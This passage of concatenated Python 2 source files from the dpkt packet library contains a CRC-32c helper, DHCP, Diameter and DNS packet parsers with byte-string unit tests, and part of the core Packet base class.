    0x115B2B19L, 0x020BD8EDL, 0xF0605BEEL, 0x24AA3F05L, 0xD6C1BC06L,
    0xC5914FF2L, 0x37FACCF1L, 0x69E9F0D5L, 0x9B8273D6L, 0x88D28022L,
    0x7AB90321L, 0xAE7367CAL, 0x5C18E4C9L, 0x4F48173DL, 0xBD23943EL,
    0xF36E6F75L, 0x0105EC76L, 0x12551F82L, 0xE03E9C81L, 0x34F4F86AL,
    0xC69F7B69L, 0xD5CF889DL, 0x27A40B9EL, 0x79B737BAL, 0x8BDCB4B9L,
    0x988C474DL, 0x6AE7C44EL, 0xBE2DA0A5L, 0x4C4623A6L, 0x5F16D052L,
    0xAD7D5351L
    )

def add(crc, buf):
    buf = array.array('B', buf)
    for b in buf:
        crc = (crc >> 8) ^ crc32c_table[(crc ^ b) & 0xff]
    return crc

def done(crc):
    tmp = ~crc & 0xffffffffL
    b0 = tmp & 0xff
    b1 = (tmp >> 8) & 0xff
    b2 = (tmp >> 16) & 0xff
    b3 = (tmp >> 24) & 0xff
    crc = (b0 << 24) | (b1 << 16) | (b2 << 8) | b3
    return crc

def cksum(buf):
    """Return computed CRC-32c checksum."""
    return done(add(0xffffffffL, buf))

########NEW FILE########
__FILENAME__ = dhcp
# $Id: dhcp.py 23 2006-11-08 15:45:33Z dugsong $

"""Dynamic Host Configuration Protocol."""

import arp, dpkt

DHCP_OP_REQUEST = 1
DHCP_OP_REPLY = 2

DHCP_MAGIC = 0x63825363

# DHCP option codes
DHCP_OPT_NETMASK =         1 # I: subnet mask
DHCP_OPT_TIMEOFFSET =      2
DHCP_OPT_ROUTER =          3 # s: list of router ips
DHCP_OPT_TIMESERVER =      4
DHCP_OPT_NAMESERVER =      5
DHCP_OPT_DNS_SVRS =        6 # s: list of DNS servers
DHCP_OPT_LOGSERV =         7
DHCP_OPT_COOKIESERV =      8
DHCP_OPT_LPRSERV =         9
DHCP_OPT_IMPSERV =         10
DHCP_OPT_RESSERV =         11
DHCP_OPT_HOSTNAME =        12 # s: client hostname
DHCP_OPT_BOOTFILESIZE =    13
DHCP_OPT_DUMPFILE =        14
DHCP_OPT_DOMAIN =          15 # s: domain name
DHCP_OPT_SWAPSERV =        16
DHCP_OPT_ROOTPATH =        17
DHCP_OPT_EXTENPATH =       18
DHCP_OPT_IPFORWARD =       19
DHCP_OPT_SRCROUTE =        20
DHCP_OPT_POLICYFILTER =    21
DHCP_OPT_MAXASMSIZE =      22
DHCP_OPT_IPTTL =           23
DHCP_OPT_MTUTIMEOUT =      24
DHCP_OPT_MTUTABLE =        25
DHCP_OPT_MTUSIZE =         26
DHCP_OPT_LOCALSUBNETS =    27
DHCP_OPT_BROADCASTADDR =   28
DHCP_OPT_DOMASKDISCOV =    29
DHCP_OPT_MASKSUPPLY =      30
DHCP_OPT_DOROUTEDISC =     31
DHCP_OPT_ROUTERSOLICIT =   32
DHCP_OPT_STATICROUTE =     33
DHCP_OPT_TRAILERENCAP =    34
DHCP_OPT_ARPTIMEOUT =      35
DHCP_OPT_ETHERENCAP =      36
DHCP_OPT_TCPTTL =          37
DHCP_OPT_TCPKEEPALIVE =    38
DHCP_OPT_TCPALIVEGARBAGE = 39
DHCP_OPT_NISDOMAIN =       40
DHCP_OPT_NISSERVERS =      41
DHCP_OPT_NISTIMESERV =     42
DHCP_OPT_VENDSPECIFIC =    43
DHCP_OPT_NBNS =            44
DHCP_OPT_NBDD =            45
DHCP_OPT_NBTCPIP =         46
DHCP_OPT_NBTCPSCOPE =      47
DHCP_OPT_XFONT =           48
DHCP_OPT_XDISPLAYMGR =     49
DHCP_OPT_REQ_IP =          50 # I: IP address
DHCP_OPT_LEASE_SEC =       51 # I: lease seconds
DHCP_OPT_OPTIONOVERLOAD =  52
DHCP_OPT_MSGTYPE =         53 # B: message type
DHCP_OPT_SERVER_ID =       54 # I: server IP address
DHCP_OPT_PARAM_REQ =       55 # s: list of option codes
DHCP_OPT_MESSAGE =         56
DHCP_OPT_MAXMSGSIZE =      57
DHCP_OPT_RENEWTIME =       58
DHCP_OPT_REBINDTIME =      59
DHCP_OPT_VENDOR_ID =       60 # s: vendor class id
DHCP_OPT_CLIENT_ID =       61 # Bs: idtype, id (idtype 0: FQDN, idtype 1: MAC)
DHCP_OPT_NISPLUSDOMAIN =   64
DHCP_OPT_NISPLUSSERVERS =  65
DHCP_OPT_MOBILEIPAGENT =   68
DHCP_OPT_SMTPSERVER =      69
DHCP_OPT_POP3SERVER =      70
DHCP_OPT_NNTPSERVER =      71
DHCP_OPT_WWWSERVER =       72
DHCP_OPT_FINGERSERVER =    73
DHCP_OPT_IRCSERVER =       74
DHCP_OPT_STSERVER =        75
DHCP_OPT_STDASERVER =      76

# DHCP message type values
DHCPDISCOVER = 1
DHCPOFFER = 2
DHCPREQUEST = 3
DHCPDECLINE = 4
DHCPACK = 5
DHCPNAK = 6
DHCPRELEASE = 7
DHCPINFORM = 8

class DHCP(dpkt.Packet):
    __hdr__ = (
        ('op', 'B', DHCP_OP_REQUEST),
        ('hrd', 'B', arp.ARP_HRD_ETH),  # just like ARP.hrd
        ('hln', 'B', 6),		# and ARP.hln
        ('hops', 'B', 0),
        ('xid', 'I', 0xdeadbeefL),
        ('secs', 'H', 0),
        ('flags', 'H', 0),
        ('ciaddr', 'I', 0),
        ('yiaddr', 'I', 0),
        ('siaddr', 'I', 0),
        ('giaddr', 'I', 0),
        ('chaddr', '16s', 16 * '\x00'),
        ('sname', '64s', 64 * '\x00'),
        ('file', '128s', 128 * '\x00'),
        ('magic', 'I', DHCP_MAGIC),
        )
    opts = (
        (DHCP_OPT_MSGTYPE, chr(DHCPDISCOVER)),
        (DHCP_OPT_PARAM_REQ, ''.join(map(chr, (DHCP_OPT_REQ_IP,
                                               DHCP_OPT_ROUTER,
                                               DHCP_OPT_NETMASK,
                                               DHCP_OPT_DNS_SVRS))))
        )				# list of (type, data) tuples

    def __len__(self):
        return self.__hdr_len__ + \
               sum([ 2 + len(o[1]) for o in self.opts ]) + 1 + len(self.data)
    
    def __str__(self):
        return self.pack_hdr() + self.pack_opts() + str(self.data)
    
    def pack_opts(self):
        """Return packed options string."""
        if not self.opts:
            return ''
        l = []
        for t, data in self.opts:
            l.append('%s%s%s' % (chr(t), chr(len(data)), data))
        l.append('\xff')
        return ''.join(l)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.chaddr = self.chaddr[:self.hln]
        buf = self.data
        l = []
        while buf:
            t = ord(buf[0])
            if t == 0xff:
                buf = buf[1:]
                break
            elif t == 0:
                buf = buf[1:]
            else:
                n = ord(buf[1])
                l.append((t, buf[2:2+n]))
                buf = buf[2+n:]
        self.opts = l
        self.data = buf

if __name__ == '__main__':
    import unittest

    class DHCPTestCast(unittest.TestCase):
        def test_DHCP(self):
            s = '\x01\x01\x06\x00\xadS\xc8c\xb8\x87\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02U\x82\xf3\xa6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\x82Sc5\x01\x01\xfb\x01\x01=\x07\x01\x00\x02U\x82\xf3\xa62\x04\n\x00\x01e\x0c\tGuinevere<\x08MSFT 5.07\n\x01\x0f\x03\x06,./\x1f!+\xff\x00\x00\x00\x00\x00'
            dhcp = DHCP(s)
            self.failUnless(s == str(dhcp))

    unittest.main()


########NEW FILE########
__FILENAME__ = diameter
# $Id: diameter.py 23 2006-11-08 15:45:33Z dugsong $

"""Diameter."""

import struct
import dpkt

# Diameter Base Protocol - RFC 3588
# http://tools.ietf.org/html/rfc3588

# Request/Answer Command Codes
ABORT_SESSION		= 274
ACCOUTING		= 271
CAPABILITIES_EXCHANGE	= 257
DEVICE_WATCHDOG		= 280
DISCONNECT_PEER		= 282
RE_AUTH			= 258
SESSION_TERMINATION	= 275

class Diameter(dpkt.Packet):
    __hdr__ = (
        ('v', 'B', 1),
        ('len', '3s', 0),
        ('flags', 'B', 0),
        ('cmd', '3s', 0),
        ('app_id', 'I', 0),
        ('hop_id', 'I', 0),
        ('end_id', 'I', 0)
        )

    def _get_r(self):
        return (self.flags >> 7) & 0x1
    def _set_r(self, r):
        self.flags = (self.flags & ~0x80) | ((r & 0x1) << 7)
    request_flag = property(_get_r, _set_r)

    def _get_p(self):
        return (self.flags >> 6) & 0x1
    def _set_p(self, p):
        self.flags = (self.flags & ~0x40) | ((p & 0x1) << 6)
    proxiable_flag = property(_get_p, _set_p)

    def _get_e(self):
        return (self.flags >> 5) & 0x1
    def _set_e(self, e):
        self.flags = (self.flags & ~0x20) | ((e & 0x1) << 5)
    error_flag = property(_get_e, _set_e)

    def _get_t(self):
        return (self.flags >> 4) & 0x1
    def _set_t(self, t):
        self.flags = (self.flags & ~0x10) | ((t & 0x1) << 4)
    retransmit_flag = property(_get_t, _set_t)

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.cmd = (ord(self.cmd[0]) << 16) | \
                   (ord(self.cmd[1]) << 8) | \
                    ord(self.cmd[2])
        self.len = (ord(self.len[0]) << 16) | \
                   (ord(self.len[1]) << 8) | \
                   ord(self.len[2])
        self.data = self.data[:self.len - self.__hdr_len__]

        l = []
        while self.data:
            avp = AVP(self.data)
            l.append(avp)
            self.data = self.data[len(avp):]
        self.data = self.avps = l

    def pack_hdr(self):
        self.len = chr((self.len >> 16) & 0xff) + \
                   chr((self.len >> 8) & 0xff) + \
                   chr(self.len & 0xff)
        self.cmd = chr((self.cmd >> 16) & 0xff) + \
                   chr((self.cmd >> 8) & 0xff) + \
                   chr(self.cmd & 0xff)
        return dpkt.Packet.pack_hdr(self)

    def __len__(self):
        return self.__hdr_len__ + \
               sum(map(len, self.data))

    def __str__(self):
        return self.pack_hdr() + \
               ''.join(map(str, self.data))

class AVP(dpkt.Packet):
    __hdr__ = (
        ('code', 'I', 0),
        ('flags', 'B', 0),
        ('len', '3s', 0),
        )

    def _get_v(self):
        return (self.flags >> 7) & 0x1
    def _set_v(self, v):
        self.flags = (self.flags & ~0x80) | ((v & 0x1) << 7)
    vendor_flag = property(_get_v, _set_v)

    def _get_m(self):
        return (self.flags >> 6) & 0x1
    def _set_m(self, m):
        self.flags = (self.flags & ~0x40) | ((m & 0x1) << 6)
    mandatory_flag = property(_get_m, _set_m)

    def _get_p(self):
        return (self.flags >> 5) & 0x1
    def _set_p(self, p):
        self.flags = (self.flags & ~0x20) | ((p & 0x1) << 5)
    protected_flag = property(_get_p, _set_p)

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.len = (ord(self.len[0]) << 16) | \
                   (ord(self.len[1]) << 8) | \
                    ord(self.len[2])

        if self.vendor_flag:
            self.vendor = struct.unpack('>I', self.data[:4])[0]
            self.data = self.data[4:self.len - self.__hdr_len__]
        else:
            self.data = self.data[:self.len - self.__hdr_len__]

    def pack_hdr(self):
        self.len = chr((self.len >> 16) & 0xff) + \
                   chr((self.len >> 8) & 0xff) + \
                   chr(self.len & 0xff)
        data = dpkt.Packet.pack_hdr(self)
        if self.vendor_flag:
            data += struct.pack('>I', self.vendor)
        return data

    def __len__(self):
        length = self.__hdr_len__ + \
                 sum(map(len, self.data))
        if self.vendor_flag:
            length += 4
        return length


if __name__ == '__main__':
    import unittest

    class DiameterTestCase(unittest.TestCase):
        def testPack(self):
            d = Diameter(self.s)
            self.failUnless(self.s == str(d))
            d = Diameter(self.t)
            self.failUnless(self.t == str(d))

        def testUnpack(self):
            d = Diameter(self.s)
            self.failUnless(d.len == 40)
            #self.failUnless(d.cmd == DEVICE_WATCHDOG_REQUEST)
            self.failUnless(d.request_flag == 1)
            self.failUnless(d.error_flag == 0)
            self.failUnless(len(d.avps) == 2)

            avp = d.avps[0]
            #self.failUnless(avp.code == ORIGIN_HOST)
            self.failUnless(avp.mandatory_flag == 1)
            self.failUnless(avp.vendor_flag == 0)
            self.failUnless(avp.len == 12)
            self.failUnless(len(avp) == 12)
            self.failUnless(avp.data == '\x68\x30\x30\x32')

            # also test the optional vendor id support
            d = Diameter(self.t)
            self.failUnless(d.len == 44)
            avp = d.avps[0]
            self.failUnless(avp.vendor_flag == 1)
            self.failUnless(avp.len == 16)
            self.failUnless(len(avp) == 16)
            self.failUnless(avp.vendor == 3735928559)
            self.failUnless(avp.data == '\x68\x30\x30\x32')

        s = '\x01\x00\x00\x28\x80\x00\x01\x18\x00\x00\x00\x00\x00\x00\x41\xc8\x00\x00\x00\x0c\x00\x00\x01\x08\x40\x00\x00\x0c\x68\x30\x30\x32\x00\x00\x01\x28\x40\x00\x00\x08'
        t = '\x01\x00\x00\x2c\x80\x00\x01\x18\x00\x00\x00\x00\x00\x00\x41\xc8\x00\x00\x00\x0c\x00\x00\x01\x08\xc0\x00\x00\x10\xde\xad\xbe\xef\x68\x30\x30\x32\x00\x00\x01\x28\x40\x00\x00\x08'
    unittest.main()

########NEW FILE########
__FILENAME__ = dns
# $Id: dns.py 27 2006-11-21 01:22:52Z dahelder $

"""Domain Name System."""

import struct
import dpkt

DNS_Q = 0
DNS_R = 1

# Opcodes
DNS_QUERY = 0
DNS_IQUERY = 1
DNS_STATUS = 2
DNS_NOTIFY = 4
DNS_UPDATE = 5

# Flags
DNS_CD = 0x0010	# checking disabled
DNS_AD = 0x0020	# authenticated data
DNS_Z =  0x0040	# unused
DNS_RA = 0x0080	# recursion available
DNS_RD = 0x0100	# recursion desired
DNS_TC = 0x0200	# truncated
DNS_AA = 0x0400	# authoritative answer

# Response codes
DNS_RCODE_NOERR = 0
DNS_RCODE_FORMERR = 1
DNS_RCODE_SERVFAIL = 2
DNS_RCODE_NXDOMAIN = 3
DNS_RCODE_NOTIMP = 4
DNS_RCODE_REFUSED = 5
DNS_RCODE_YXDOMAIN = 6
DNS_RCODE_YXRRSET = 7
DNS_RCODE_NXRRSET = 8
DNS_RCODE_NOTAUTH = 9
DNS_RCODE_NOTZONE = 10

# RR types
DNS_A = 1
DNS_NS = 2
DNS_CNAME = 5
DNS_SOA = 6
DNS_PTR = 12
DNS_HINFO = 13
DNS_MX = 15
DNS_TXT = 16
DNS_AAAA = 28
DNS_SRV = 33

# RR classes
DNS_IN = 1
DNS_CHAOS = 3
DNS_HESIOD = 4
DNS_ANY = 255

def pack_name(name, off, label_ptrs):
    if name:
        labels = name.split('.')
    else:
        labels = []
    labels.append('')
    buf = ''
    for i, label in enumerate(labels):
        key = '.'.join(labels[i:]).upper()
        ptr = label_ptrs.get(key)
        if not ptr:
            if len(key) > 1:
                ptr = off + len(buf)
                if ptr < 0xc000:
                    label_ptrs[key] = ptr
            i = len(label)
            buf += chr(i) + label
        else:
            buf += struct.pack('>H', (0xc000 | ptr))
            break
    return buf

def unpack_name(buf, off):
    name = ''
    saved_off = 0
    for i in range(100): # XXX
        n = ord(buf[off])
        if n == 0:
            off += 1
            break
        elif (n & 0xc0) == 0xc0:
            ptr = struct.unpack('>H', buf[off:off+2])[0] & 0x3fff
            off += 2
            if not saved_off:
                saved_off = off
            # XXX - don't use recursion!@#$
            name = name + unpack_name(buf, ptr)[0] + '.'
            break
        else:
            off += 1
            name = name + buf[off:off+n] + '.'
            if len(name) > 255:
                raise dpkt.UnpackError('name longer than 255 bytes')
            off += n
    return name.strip('.'), off

class DNS(dpkt.Packet):
    __hdr__ = (
        ('id', 'H', 0),
        ('op', 'H', DNS_RD),	# recursive query
        # XXX - lists of query, RR objects
        ('qd', 'H', []),
        ('an', 'H', []),
        ('ns', 'H', []),
        ('ar', 'H', [])
        )
    def get_qr(self):
        return int((self.op & 0x8000) == 0x8000)
    def set_qr(self, v):
        if v: self.op |= 0x8000
        else: self.op &= ~0x8000
    qr = property(get_qr, set_qr)

    def get_opcode(self):
        return (self.op >> 11) & 0xf
    def set_opcode(self, v):
        self.op = (self.op & ~0x7800) | ((v & 0xf) << 11)
    opcode = property(get_opcode, set_opcode)

    def get_rcode(self):
        return self.op & 0xf
    def set_rcode(self, v):
        self.op = (self.op & ~0xf) | (v & 0xf)
    rcode = property(get_rcode, set_rcode)
    
    class Q(dpkt.Packet):
        """DNS question."""
        __hdr__ = (
            ('name', '1025s', ''),
            ('type', 'H', DNS_A),
            ('cls', 'H', DNS_IN)
            )
        # XXX - suk
        def __len__(self):
            raise NotImplementedError
        __str__ = __len__
        def unpack(self, buf):
            raise NotImplementedError

    class RR(Q):
        """DNS resource record."""
        __hdr__ = (
            ('name', '1025s', ''),
            ('type', 'H', DNS_A),
            ('cls', 'H', DNS_IN),
            ('ttl', 'I', 0),
            ('rlen', 'H', 4),
            ('rdata', 's', '')
            )
        def pack_rdata(self, off, label_ptrs):
            # XXX - yeah, this sux
            if self.rdata:
                return self.rdata
            if self.type == DNS_A:
                return self.ip
            elif self.type == DNS_NS:
                return pack_name(self.nsname, off, label_ptrs)
            elif self.type == DNS_CNAME:
                return pack_name(self.cname, off, label_ptrs)
            elif self.type == DNS_PTR:
                return pack_name(self.ptrname, off, label_ptrs)
            elif self.type == DNS_SOA:
                l = []
                l.append(pack_name(self.mname, off, label_ptrs))
                l.append(pack_name(self.rname, off + len(l[0]), label_ptrs))
                l.append(struct.pack('>IIIII', self.serial, self.refresh,
                                     self.retry, self.expire, self.minimum))
                return ''.join(l)
            elif self.type == DNS_MX:
                return struct.pack('>H', self.preference) + \
                       pack_name(self.mxname, off + 2, label_ptrs)
            elif self.type == DNS_TXT or self.type == DNS_HINFO:
                return ''.join([ '%s%s' % (chr(len(x)), x)
                                 for x in self.text ])
            elif self.type == DNS_AAAA:
                return self.ip6
            elif self.type == DNS_SRV:
                return struct.pack('>HHH', self.priority, self.weight, self.port) + \
                       pack_name(self.srvname, off + 6, label_ptrs)
        
        def unpack_rdata(self, buf, off):
            if self.type == DNS_A:
                self.ip = self.rdata
            elif self.type == DNS_NS:
                self.nsname, off = unpack_name(buf, off)
            elif self.type == DNS_CNAME:
                self.cname, off = unpack_name(buf, off)
            elif self.type == DNS_PTR:
                self.ptrname, off = unpack_name(buf, off)
            elif self.type == DNS_SOA:
                self.mname, off = unpack_name(buf, off)
                self.rname, off = unpack_name(buf, off)
                self.serial, self.refresh, self.retry, self.expire, \
                    self.minimum = struct.unpack('>IIIII', buf[off:off+20])
            elif self.type == DNS_MX:
                self.preference = struct.unpack('>H', self.rdata[:2])
                self.mxname, off = unpack_name(buf, off+2)
            elif self.type == DNS_TXT or self.type == DNS_HINFO:
                self.text = []
                buf = self.rdata
                while buf:
                    n = ord(buf[0])
                    self.text.append(buf[1:1+n])
                    buf = buf[1+n:]
            elif self.type == DNS_AAAA:
                self.ip6 = self.rdata
            elif self.type == DNS_SRV:
                self.priority, self.weight, self.port = \
                    struct.unpack('>HHH', self.rdata[:6])
                self.srvname, off = unpack_name(buf, off+6)
    
    def pack_q(self, buf, q):
        """Append packed DNS question and return buf."""
        return buf + pack_name(q.name, len(buf), self.label_ptrs) + \
               struct.pack('>HH', q.type, q.cls)
    
    def unpack_q(self, buf, off):
        """Return DNS question and new offset."""
        q = self.Q()
        q.name, off = unpack_name(buf, off)
        q.type, q.cls = struct.unpack('>HH', buf[off:off+4])
        off += 4
        return q, off

    def pack_rr(self, buf, rr):
        """Append packed DNS RR and return buf."""
        name = pack_name(rr.name, len(buf), self.label_ptrs)
        rdata = rr.pack_rdata(len(buf) + len(name) + 10, self.label_ptrs)
        return buf + name + struct.pack('>HHIH', rr.type, rr.cls, rr.ttl,
                                        len(rdata)) + rdata
    
    def unpack_rr(self, buf, off):
        """Return DNS RR and new offset."""
        rr = self.RR()
        rr.name, off = unpack_name(buf, off)
        rr.type, rr.cls, rr.ttl, rdlen = struct.unpack('>HHIH', buf[off:off+10])
        off += 10
        rr.rdata = buf[off:off+rdlen]
        rr.unpack_rdata(buf, off)
        off += rdlen
        return rr, off
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        off = self.__hdr_len__
        cnt = self.qd
        self.qd = []
        for i in range(cnt):
            q, off = self.unpack_q(buf, off)
            self.qd.append(q)
        for x in ('an', 'ns', 'ar'):
            cnt = getattr(self, x, 0)
            setattr(self, x, [])
            for i in range(cnt):
                rr, off = self.unpack_rr(buf, off)
                getattr(self, x).append(rr)
        self.data = ''

    def __len__(self):
        # XXX - cop out
        return len(str(self))

    def __str__(self):
        # XXX - compress names on the fly
        self.label_ptrs = {}
        buf = struct.pack(self.__hdr_fmt__, self.id, self.op, len(self.qd),
                          len(self.an), len(self.ns), len(self.ar))
        for q in self.qd:
            buf = self.pack_q(buf, q)
        for x in ('an', 'ns', 'ar'):
            for rr in getattr(self, x):
                buf = self.pack_rr(buf, rr)
        del self.label_ptrs
        return buf

if __name__ == '__main__':
    import unittest
    from ip import IP

    class DNSTestCase(unittest.TestCase):
        def test_basic(self):
            s = 'E\x00\x02\x08\xc15\x00\x00\x80\x11\x92aBk0\x01Bk0w\x005\xc07\x01\xf4\xda\xc2d\xd2\x81\x80\x00\x01\x00\x03\x00\x0b\x00\x0b\x03www\x06google\x03com\x00\x00\x01\x00\x01\xc0\x0c\x00\x05\x00\x01\x00\x00\x03V\x00\x17\x03www\x06google\x06akadns\x03net\x00\xc0,\x00\x01\x00\x01\x00\x00\x01\xa3\x00\x04@\xe9\xabh\xc0,\x00\x01\x00\x01\x00\x00\x01\xa3\x00\x04@\xe9\xabc\xc07\x00\x02\x00\x01\x00\x00KG\x00\x0c\x04usw5\x04akam\xc0>\xc07\x00\x02\x00\x01\x00\x00KG\x00\x07\x04usw6\xc0t\xc07\x00\x02\x00\x01\x00\x00KG\x00\x07\x04usw7\xc0t\xc07\x00\x02\x00\x01\x00\x00KG\x00\x08\x05asia3\xc0t\xc07\x00\x02\x00\x01\x00\x00KG\x00\x05\x02za\xc07\xc07\x00\x02\x00\x01\x00\x00KG\x00\x0f\x02zc\x06akadns\x03org\x00\xc07\x00\x02\x00\x01\x00\x00KG\x00\x05\x02zf\xc07\xc07\x00\x02\x00\x01\x00\x00KG\x00\x05\x02zh\xc0\xd5\xc07\x00\x02\x00\x01\x00\x00KG\x00\x07\x04eur3\xc0t\xc07\x00\x02\x00\x01\x00\x00KG\x00\x07\x04use2\xc0t\xc07\x00\x02\x00\x01\x00\x00KG\x00\x07\x04use4\xc0t\xc0\xc1\x00\x01\x00\x01\x00\x00\xfb4\x00\x04\xd0\xb9\x84\xb0\xc0\xd2\x00\x01\x00\x01\x00\x001\x0c\x00\x04?\xf1\xc76\xc0\xed\x00\x01\x00\x01\x00\x00\xfb4\x00\x04?\xd7\xc6S\xc0\xfe\x00\x01\x00\x01\x00\x001\x0c\x00\x04?\xd00.\xc1\x0f\x00\x01\x00\x01\x00\x00\n\xdf\x00\x04\xc1-\x01g\xc1"\x00\x01\x00\x01\x00\x00\x101\x00\x04?\xd1\xaa\x88\xc15\x00\x01\x00\x01\x00\x00\r\x1a\x00\x04PCC\xb6\xc0o\x00\x01\x00\x01\x00\x00\x10\x7f\x00\x04?\xf1I\xd6\xc0\x87\x00\x01\x00\x01\x00\x00\n\xdf\x00\x04\xce\x84dl\xc0\x9a\x00\x01\x00\x01\x00\x00\n\xdf\x00\x04A\xcb\xea\x1b\xc0\xad\x00\x01\x00\x01\x00\x00\x0b)\x00\x04\xc1l\x9a\t'
            ip = IP(s)
            dns = DNS(ip.udp.data)
            self.failUnless(dns.qd[0].name == 'www.google.com' and
                            dns.an[1].name == 'www.google.akadns.net')
            s = '\x05\xf5\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x03cnn\x03com\x00\x00\x01\x00\x01'
            dns = DNS(s)
            self.failUnless(s == str(dns))

        def test_PTR(self):
            s = 'g\x02\x81\x80\x00\x01\x00\x01\x00\x03\x00\x00\x011\x011\x03211\x03141\x07in-addr\x04arpa\x00\x00\x0c\x00\x01\xc0\x0c\x00\x0c\x00\x01\x00\x00\r6\x00$\x07default\nv-umce-ifs\x05umnet\x05umich\x03edu\x00\xc0\x0e\x00\x02\x00\x01\x00\x00\r6\x00\r\x06shabby\x03ifs\xc0O\xc0\x0e\x00\x02\x00\x01\x00\x00\r6\x00\x0f\x0cfish-license\xc0m\xc0\x0e\x00\x02\x00\x01\x00\x00\r6\x00\x0b\x04dns2\x03itd\xc0O'
            dns = DNS(s)
            self.failUnless(dns.qd[0].name == '1.1.211.141.in-addr.arpa' and
                            dns.an[0].ptrname == 'default.v-umce-ifs.umnet.umich.edu' and
                            dns.ns[0].nsname == 'shabby.ifs.umich.edu' and
                            dns.ns[1].ttl == 3382L and
                            dns.ns[2].nsname == 'dns2.itd.umich.edu')
            self.failUnless(s == str(dns))
    
        def test_pack_name(self):
            # Empty name is \0
            x = pack_name('', 0, {})
            self.assertEqual(x, '\0')

    unittest.main()

########NEW FILE########
__FILENAME__ = dpkt

# $Id: dpkt.py 43 2007-08-02 22:42:59Z jon.oberheide $

"""Simple packet creation and parsing."""

import copy, itertools, socket, struct

class Error(Exception): pass
class UnpackError(Error): pass
class NeedData(UnpackError): pass
class PackError(Error): pass

class _MetaPacket(type):
    def __new__(cls, clsname, clsbases, clsdict):
        t = type.__new__(cls, clsname, clsbases, clsdict)
        st = getattr(t, '__hdr__', None)
        if st is not None:
            # XXX - __slots__ only created in __new__()
            clsdict['__slots__'] = [ x[0] for x in st ] + [ 'data' ]
            t = type.__new__(cls, clsname, clsbases, clsdict)
            t.__hdr_fields__ = [ x[0] for x in st ]
            t.__hdr_fmt__ = getattr(t, '__byte_order__', '>') + \
                            ''.join([ x[1] for x in st ])
            t.__hdr_len__ = struct.calcsize(t.__hdr_fmt__)
            t.__hdr_defaults__ = dict(zip(
                t.__hdr_fields__, [ x[2] for x in st ]))
        return t

class Packet(object):
    """Base packet class, with metaclass magic to generate members from
    self.__hdr__.

    __hdr__ should be defined as a list of (name, structfmt, default) tuples
    __byte_order__ can be set to override the default ('>')

    Example::

    >>> class Foo(Packet):
    ...   __hdr__ = (('foo', 'I', 1), ('bar', 'H', 2), ('baz', '4s', 'quux'))
    ...
    >>> foo = Foo(bar=3)
    >>> foo
    Foo(bar=3)
    >>> str(foo)
    '\x00\x00\x00\x01\x00\x03quux'
    >>> foo.bar
    3
    >>> foo.baz
    'quux'
    >>> foo.foo = 7
    >>> foo.baz = 'whee'
    >>> foo
    Foo(baz='whee', foo=7, bar=3)
    >>> Foo('hello, world!')
    Foo(baz=' wor', foo=1751477356L, bar=28460, data='ld!')
    """
    __metaclass__ = _MetaPacket
    
    def __init__(self, *args, **kwargs):
        """Packet constructor with ([buf], [field=val,...]) prototype.

        Arguments:

        buf -- optional packet buffer to unpack

        Optional keyword arguments correspond to members to set
        (matching fields in self.__hdr__, or 'data').
        """
        self.data = ''
        if args:
            try:
                self.unpack(args[0])
            except struct.error:
                if len(args[0]) < self.__hdr_len__:
                    raise NeedData
                raise UnpackError('invalid %s: %r' %
                                  (self.__class__.__name__, args[0]))
        else:
            for k in self.__hdr_fields__:
                setattr(self, k, copy.copy(self.__hdr_defaults__[k]))
            for k, v in kwargs.iteritems():
                setattr(self, k, v)

    def __len__(self):
        return self.__hdr_len__ + len(self.data)

    def __getitem__(self, k):
        try: return getattr(self, k)
        except AttributeError: raise KeyError
        
    def __repr__(self):
        l = [ '%s=%r' % (k, getattr(self, k))
              for k in self.__hdr_defaults__
              if getattr(self, k) != self.__hdr_defaults__[k] ]
        if self.data:
            l.append('data=%r' % self.data)
        return '%s(%s)' % (self.__class__.__name__, ', '.join(l))

    def __str__(self):
        return self.pack_hdr() + str(self.data)
    
    def pack_hdr(self):
        """Return packed header string."""
        try:
            return struct.pack(self.__hdr_fmt__,
                            *[ getattr(self, k) for k in self.__hdr_fields__ ])
        except struct.error:
            vals = []
            for k in self.__hdr_fields__:
                v = getattr(self, k)
                if isinstance(v, tuple):
                    vals.extend(v)
                else:
                    vals.append(v)
            try:
                return struct.pack(self.__hdr_fmt__, *vals)
            except struct.error, e:
                raise PackError(str(e))

    def pack(self):
        """Return packed header + self.data string."""
        return str(self)
    
    def unpack(self, buf):
        """Unpack packet header fields from buf, and set self.data."""
        for k, v in itertools.izip(self.__hdr_fields__,
            struct.unpack(self.__hdr_fmt__, buf[:self.__hdr_len__])):
            setattr(self, k, v)
        self.data = buf[self.__hdr_len__:]

# XXX - ''.join([(len(`chr(x)`)==3) and chr(x) or '.' for x in range(256)])
__vis_filter = """................................ !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[.]^_`abcdefghijklmnopqrstuvwxyz{|}~................................................................................................................................."""

def hexdump(buf, length=16):
    """Return a hexdump output string of the given buffer."""
    n = 0
    res = []
    while buf:
        line, buf = buf[:length], buf[length:]
